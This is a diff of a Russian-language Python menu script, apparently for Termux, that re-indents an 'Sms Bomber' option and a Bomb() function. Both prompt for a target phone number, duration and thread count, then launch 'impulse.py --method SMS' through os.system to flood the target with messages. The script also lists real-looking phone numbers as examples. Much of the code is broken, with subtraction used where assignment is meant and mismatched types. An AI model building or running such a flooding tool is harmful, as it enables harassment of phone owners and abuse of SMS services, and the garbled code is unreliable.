@@ -91,86 +91,84 @@ def osnova():
     global numb
     numb = (input(colored(" —>> ", "red")))
     if numb == "1" or numb == "Sms Bomber":
+	print("")
+	st = colored("start", "green")
+	st2 = colored("[2]", "cyan")
+	# --
+	ex = colored("Назад", "red")
+	ex2 = colored("[0]", "red")
+	# --
+	up = colored("download modules", "yellow")
+	up2 = colored("[1]", "cyan")
+
+	print(up2, up)
+	print(st2, st)
+
+	print("")
+	print("")
+	print(ex2, ex)
+	print("")
+	q = input(colored(" —>> ", "red"))
+	if q == "download modules" or q == "1":
 		print("")
-		st = colored("start", "green")
-		st2 = colored("[2]", "cyan")
+		os.system("pip install --upgrade pip")
+		os.system("pip install wget && pip install humanfriendly")
+		print("")
+		aga = colored("Complete!", "green")
+		aga2 = colored("Download of modules is ", "yellow")
+		print(aga2, aga)
+		print("")
+		while True:
+			sleep(1.15)
+			Bomb()
+	elif q == "2" or q == "start":
+		print("")
+		print(colored("Примеры", "green"))
+		print("")
 		# --
-		ex = colored("Назад", "red")
-		ex2 = colored("[0]", "red")
+		PHONES = ["79506258294", "79857255263", "79087147393", "79057148241", "78008366273", "78005553535"]
+		RandPHONE = choice(PHONES)
+		ColorPHONE = colored(RandPHONE, "blue")
 		# --
-		up = colored("download modules", "yellow")
-		up2 = colored("[1]", "cyan")
-
-		print(up2, up)
-		print(st2, st)
-
+		Colors = ["white", "yellow", "green", "blue", "cyan", "magenta", "red"]
+		RandColor = choice(Colors)
+		RandNumb = randint(10, 1000)
+		time = colored("", RandColor)
+		# --
+		RandNumb2 = randint(3, 200)
+		
+		print("PHONE -", ColorPHONE)
+		print("Время -", RandNumb + "сек")
+		print("Мощность - От 3-200")
 		print("")
+		sleep(1.3)
+		PHONE - input(colored(" PHONE >> ", "red"))
+		time - input(colored(" Время >> ", "red"))
+		threads - input(colored(" Мощность >> ", "red"))
 		print("")
-		print(ex2, ex)
+		print(colored("Хотите начать спам через опредленое время или сразу?", "yellow"))
+		print(colored("Если через определнное время, укажите его в секундах", "green"))
+		print(colored("Если сразу напишите 0", "green"))
 		print("")
-		q = input(colored(" —>> ", "red"))
-		if q == "download modules" or q == "1":
-			print("")
-			os.system("pip install --upgrade pip")
-			os.system("pip install wget && pip install humanfriendly")
-			print("")
-			aga = colored("Complete!", "green")
-			aga2 = colored("Download of modules is ", "yellow")
-			print(aga2, aga)
-			print("")
-			while True:
-				sleep(1.15)
-				Bomb()
-		elif q == "2" or q == "start":
-			print("")
-			print(colored("Примеры", "green"))
-			print("")
-			# --
-			PHONES = ["79506258294", "79857255263", "79087147393", "79057148241", "78008366273", "78005553535"]
-			RandPHONE = choice(PHONES)
-			ColorPHONE = colored(RandPHONE, "blue")
-			# --
-			Colors = ["white", "yellow", "green", "blue", "cyan", "magenta", "red"]
-			RandColor = choice(Colors)
-			RandNumb = randint(10, 1000)
-			time = colored("", RandColor)
-			# --
-			RandNumb2 = randint(3, 200)
+		okey = input(colored(" —>> ", "red"))
 
-			print("PHONE -", ColorPHONE)
-			print("Время -", RandNumb + "сек")
-			print("Мощность - От 3-200")
+		if okey == "0":
+			os.system("cd % && python impulse.py --target " + PHONE + " --method SMS --time " + time + " --threads " + threads)
+		elif okey < "0":
 			print("")
-			sleep(1.3)
-			PHONE - input(colored(" PHONE >> ", "red"))
-			time - input(colored(" Время >> ", "red"))
-			threads - input(colored(" Мощность >> ", "red"))
-			print("")
-			print(colored("Хотите начать спам через опредленое время или сразу?", "yellow"))
-			print(colored("Если через определнное время, укажите его в секундах", "green"))
-			print(colored("Если сразу напишите 0", "green"))
-			print("")
-			okey = input(colored(" —>> ", "red"))
-
-			if okey == "0":
-				os.system(
-					"cd % && python impulse.py --target " + PHONE + " --method SMS --time " + time + " --threads " + threads)
-			elif okey < "0":
-				print("")
 			bol = colored("БОЛЬНОЙ??", "red")
 			print("Ты " + bol)
 			print("")
 			sleep(1.1)
 			sys.exit(0)
-			else:
-			sleep(okey)
-			os.system(
-				"cd % && python impulse.py --target " + PHONE + " --method SMS --time " + time + " --threads " + threads)
 		else:
-			os.system("clear")
-			while True:
-				Banner()
-				osnova()
+			sleep(okey)
+			os.system("cd % && python impulse.py --target " + PHONE + " --method SMS --time " + time + " --threads " + threads)
+	else:
+		os.system("clear")
+		while True:
+			Banner()
+			osnova()
     elif numb == "2" or numb == "VPN For Termux":
         print("")
         print(grf, grf3)
@@ -371,85 +369,84 @@ def RVpn():
 
 
 def Bomb():
-    print("")
-    st = colored("start", "green")
-    st2 = colored("[2]", "cyan")
-    # --
-    ex = colored("Назад", "red")
-    ex2 = colored("[0]", "red")
-    # --
-    up = colored("download modules", "yellow")
-    up2 = colored("[1]", "cyan")
+	print("")
+	st = colored("start", "green")
+	st2 = colored("[2]", "cyan")
+	# --
+	ex = colored("Назад", "red")
+	ex2 = colored("[0]", "red")
+	# --
+	up = colored("download modules", "yellow")
+	up2 = colored("[1]", "cyan")
 
-    print(up2, up)
-    print(st2, st)
+	print(up2, up)
+	print(st2, st)
 
-    print("")
-    print("")
-    print(ex2, ex)
-    print("")
-    q = input(colored(" —>> ", "red"))
-    if q == "download modules" or q == "1":
-        print("")
-    	os.system("pip install --upgrade pip")
-    	os.system("pip install wget && pip install humanfriendly")
-    	print("")
-    	aga = colored("Complete!", "green")
-    	aga2 = colored("Download of modules is ", "yellow")
-    	print(aga2, aga)
-    	print("")
-    	while True:
+	print("")
+	print("")
+	print(ex2, ex)
+	print("")
+	q = input(colored(" —>> ", "red"))
+	if q == "download modules" or q == "1":
+		print("")
+		os.system("pip install --upgrade pip")
+		os.system("pip install wget && pip install humanfriendly")
+		print("")
+		aga = colored("Complete!", "green")
+		aga2 = colored("Download of modules is ", "yellow")
+		print(aga2, aga)
+		print("")
+		while True:
 			sleep(1.15)
-      		Bomb()
-    elif q == "2" or q == "start":
-    	print("")
-    	print(colored("Примеры", "green"))
-    	print("")
-    	# --
-    	PHONES = ["79506258294", "79857255263", "79087147393", "79057148241", "78008366273", "78005553535"]
-    	RandPHONE = choice(PHONES)
-    	ColorPHONE = colored(RandPHONE, "blue")
-    	# --
-    	Colors = ["white", "yellow", "green", "blue", "cyan", "magenta", "red"]
-    	RandColor = choice(Colors)
-    	RandNumb = randint(10, 1000)
-    	time = colored("", RandColor)
-    	# --
-    	RandNumb2 = randint(3, 200)
-
-    	print("PHONE -", ColorPHONE)
-    	print("Время -", RandNumb + "сек")
-    	print("Мощность - От 3-200")
-    	print("")
-    	sleep(1.3)
-    	PHONE - input(colored(" PHONE >> ", "red"))
-    	time - input(colored(" Время >> ", "red"))
-    	threads - input(colored(" Мощность >> ", "red"))
-    	print("")
-    	print(colored("Хотите начать спам через опредленое время или сразу?", "yellow"))
-    	print(colored("Если через определнное время, укажите его в секундах", "green"))
-    	print(colored("Если сразу напишите 0", "green"))
-    	print("")
-    	okey = input(colored(" —>> ", "red"))
-
+			Bomb()
+	elif q == "2" or q == "start":
+		print("")
+		print(colored("Примеры", "green"))
+		print("")
+		# --
+		PHONES = ["79506258294", "79857255263", "79087147393", "79057148241", "78008366273", "78005553535"]
+		RandPHONE = choice(PHONES)
+		ColorPHONE = colored(RandPHONE, "blue")
+		# --
+		Colors = ["white", "yellow", "green", "blue", "cyan", "magenta", "red"]
+		RandColor = choice(Colors)
+		RandNumb = randint(10, 1000)
+		time = colored("", RandColor)
+		# --
+		RandNumb2 = randint(3, 200)
+		
+		print("PHONE -", ColorPHONE)
+		print("Время -", RandNumb + "сек")
+		print("Мощность - От 3-200")
+		print("")
+		sleep(1.3)
+		PHONE - input(colored(" PHONE >> ", "red"))
+		time - input(colored(" Время >> ", "red"))
+		threads - input(colored(" Мощность >> ", "red"))
+		print("")
+		print(colored("Хотите начать спам через опредленое время или сразу?", "yellow"))
+		print(colored("Если через определнное время, укажите его в секундах", "green"))
+		print(colored("Если сразу напишите 0", "green"))
+		print("")
+		okey = input(colored(" —>> ", "red"))
 
 		if okey == "0":
- 			os.system("cd % && python impulse.py --target " + PHONE + " --method SMS --time " + time + " --threads " + threads)
+			os.system("cd % && python impulse.py --target " + PHONE + " --method SMS --time " + time + " --threads " + threads)
 		elif okey < "0":
-    		print("")
-    		bol = colored("БОЛЬНОЙ??", "red")
-    		print("Ты " + bol)
-    		print("")
-    		sleep(1.1)
-    		sys.exit(0)
+			print("")
+			bol = colored("БОЛЬНОЙ??", "red")
+			print("Ты " + bol)
+			print("")
+			sleep(1.1)
+			sys.exit(0)
 		else:
-    		sleep(okey)
-    		os.system("cd % && python impulse.py --target " + PHONE + " --method SMS --time " + time + " --threads " + threads)
+			sleep(okey)
+			os.system("cd % && python impulse.py --target " + PHONE + " --method SMS --time " + time + " --threads " + threads)
 	else:
 		os.system("clear")
 		while True:
-    		Banner()
-    		osnova()
+			Banner()
+			osnova()
 
 # Ядро Кода
 numb = (input(colored(" —>> ", "red")))
